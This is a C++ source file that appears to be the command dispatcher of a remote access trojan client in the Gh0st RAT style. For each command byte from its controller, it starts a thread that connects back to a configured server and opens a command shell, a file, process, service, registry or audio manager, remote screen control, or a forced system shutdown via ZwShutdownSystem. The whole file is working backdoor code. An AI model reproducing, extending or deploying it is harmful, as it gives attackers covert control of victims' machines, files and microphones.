#include "stdafx.h"

#include <tchar.h>

#include "Common.h"
#include "IOCPClient.h"

#include "KernelManager.h"
#include "InstanceMessage.h"
#include "ProcessManager.h"
#include "CmdManager.h"
#include "WindowManager.h"
#include "RemoteControl.h"
#include "FileManager.h"
#include "ServiceManager.h"
#include "AudioManager.h"
#include "RegistryManager.h"


extern CHAR      __ServerIP[MAX_PATH];
extern USHORT    __ServerPort;

CKernelManager::CKernelManager(CIOCPClient* IOCPClient) 
	: CManager(IOCPClient)
{
	_M_ThreadCounts = 0;

	return;
}

CKernelManager::~CKernelManager()
{
	// do nothing
}


void CKernelManager::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
	case CLIENT_GET_OUT:
	{
		_M_IOCPClient->Disconnect();
		break;
	}

	case CLIENT_INSTANT_MESSAGE_REQUEST:
	{
		IsToken = CLIENT_INSTANT_MESSAGE_REQUEST;
		_M_hThread[_M_ThreadCounts++] =
			CreateThread(
				NULL,
				0,
				(LPTHREAD_START_ROUTINE)_InstantMessageProc,
				NULL,
				0,
				NULL
			);
		break;
	}
	case CLIENT_SHUT_DOWN_REQUEST:
	{
		IsToken = CLIENT_SHUT_DOWN_REQUEST;
		_M_IOCPClient->OnServerSending((char*)&IsToken, TRUE);
		Sleep(1);
		EnableSeDebugPrivilege(_T("SeShutDownPrivilege"), TRUE);

		SysShutDown();

		EnableSeDebugPrivilege(_T("SeShutDownPrivilege"), FALSE);
		break;
	}
	case CLIENT_CMD_MANAGER_REQUIRE:
	{
		_M_hThread[_M_ThreadCounts++] = CreateThread(
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)_CMDManagerProc,
			NULL,
			0,
			NULL
		);
		break;
	}
	case CLIENT_PROCESS_MANAGER_REQUIRE:
	{
		_M_hThread[_M_ThreadCounts++] = CreateThread(
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)_ProcessManagerProc,
			NULL,
			0,
			NULL
		);
		break;
	}
	case CLIENT_WINDOW_MANAGER_REQUIRE:
	{
		_M_hThread[_M_ThreadCounts++] = CreateThread(
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)_WindowManagerProc,
			NULL,
			0,
			NULL
		);
		break;
	}
	case CLIENT_REMOTE_CONTROL_REQUIRE:
	{
		_M_hThread[_M_ThreadCounts++] = CreateThread(
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)_RemoteControlProc,
			NULL,
			0,
			NULL
		);
		break;
	}
	case CLIENT_FILE_MANAGER_REQUIRE:
	{
		_M_hThread[_M_ThreadCounts++] = CreateThread(
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)_FileManagerProc,
			NULL,
			0,
			NULL
		);
		break;
	}
	case CLIENT_SERVICE_MANAGER_REQUIRE:
	{
		_M_hThread[_M_ThreadCounts++] = CreateThread(
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)_ServiceManagerProc,
			NULL,
			0,
			NULL
		);
		break;
	}
	case CLIENT_AUDIO_MANAGER_REQUIRE:
	{
		_M_hThread[_M_ThreadCounts++] = CreateThread(
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)_AudioManagerProc,
			NULL,
			0,
			NULL
		);
		break;
	}
	case CLIENT_REGISTRY_MANAGER_REQUIRE:
	{
		_M_hThread[_M_ThreadCounts++] = CreateThread(
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)_RegistryManagerProc,
			NULL,
			0,
			NULL
		);
		break;
	}
	default:
		break;
	}

	return;
}

VOID CKernelManager::SysShutDown()
{
	HMODULE hNtdllModule = LoadLibrary(_T("Ntdll.dll"));
	if (hNtdllModule == NULL)
	{
		return;
	}
	typedef int(_stdcall *lpfn_ZwShutdownSystem)(int);
	lpfn_ZwShutdownSystem ZwShutdownSystem = NULL;

	ZwShutdownSystem = (lpfn_ZwShutdownSystem)(GetProcAddress(hNtdllModule, "ZwShutdownSystem"));
	
	if (ZwShutdownSystem == NULL)
	{
		FreeLibrary(hNtdllModule);
		hNtdllModule = NULL;
		return;
	}
	ZwShutdownSystem(2);

	return;
}


DWORD WINAPI _InstantMessageProc (LPVOID lParam)
{
	CIOCPClient IOCPClient;
	if (!IOCPClient.ConnectServer(__ServerIP, __ServerPort))
		return -1;
	CClientInstantManager Manager(&IOCPClient);
	IOCPClient.WaitForEvent();

	return 0;
}

DWORD WINAPI _CMDManagerProc     (LPVOID lParam)
{
	CIOCPClient IOCPClient;
	if (!IOCPClient.ConnectServer(__ServerIP, __ServerPort))
		return -1;
	CCMDManager Manager(&IOCPClient);
	IOCPClient.WaitForEvent();

	return 0;
}

DWORD WINAPI _ProcessManagerProc (LPVOID lParam)
{
	CIOCPClient IOCPClient;
	if (!IOCPClient.ConnectServer(__ServerIP, __ServerPort))
		return -1;
	CProcessManager Manager(&IOCPClient);
	IOCPClient.WaitForEvent();

	return 0;
}

DWORD WINAPI _WindowManagerProc  (LPVOID lParam)
{
	CIOCPClient IOCPClient;
	if (!IOCPClient.ConnectServer(__ServerIP, __ServerPort))
		return -1;
	CWindowManager Manager(&IOCPClient);
	IOCPClient.WaitForEvent();

	return 0;
}

DWORD WINAPI _RemoteControlProc  (LPVOID lParam)
{
	CIOCPClient IOCPClient;
	if (!IOCPClient.ConnectServer(__ServerIP, __ServerPort))
		return -1;
	CRemoteControl Manager(&IOCPClient);
	IOCPClient.WaitForEvent();

	return 0;
}

DWORD WINAPI _FileManagerProc    (LPVOID lParam)
{
	CIOCPClient IOCPClient;
	if (!IOCPClient.ConnectServer(__ServerIP, __ServerPort))
		return -1;
	CFileManager Manager(&IOCPClient);
	IOCPClient.WaitForEvent();

	return 0;
}

DWORD WINAPI _ServiceManagerProc (LPVOID lParam)
{
	CIOCPClient IOCPClient;
	if (!IOCPClient.ConnectServer(__ServerIP, __ServerPort))
		return -1;
	CServiceManager Manager(&IOCPClient);
	IOCPClient.WaitForEvent();

	return 0;
}

DWORD WINAPI _AudioManagerProc   (LPVOID lParam)
{
	CIOCPClient IOCPClient;
	if (!IOCPClient.ConnectServer(__ServerIP, __ServerPort))
		return -1;
	CAudioManager Manager(&IOCPClient);
	IOCPClient.WaitForEvent();

	return 0;
}

DWORD WINAPI _RegistryManagerProc(LPVOID lParam)
{
	CIOCPClient IOCPClient;
	if (!IOCPClient.ConnectServer(__ServerIP, __ServerPort))
		return -1;
	CRegistryManager Manager(&IOCPClient);
	IOCPClient.WaitForEvent();

	return 0;
}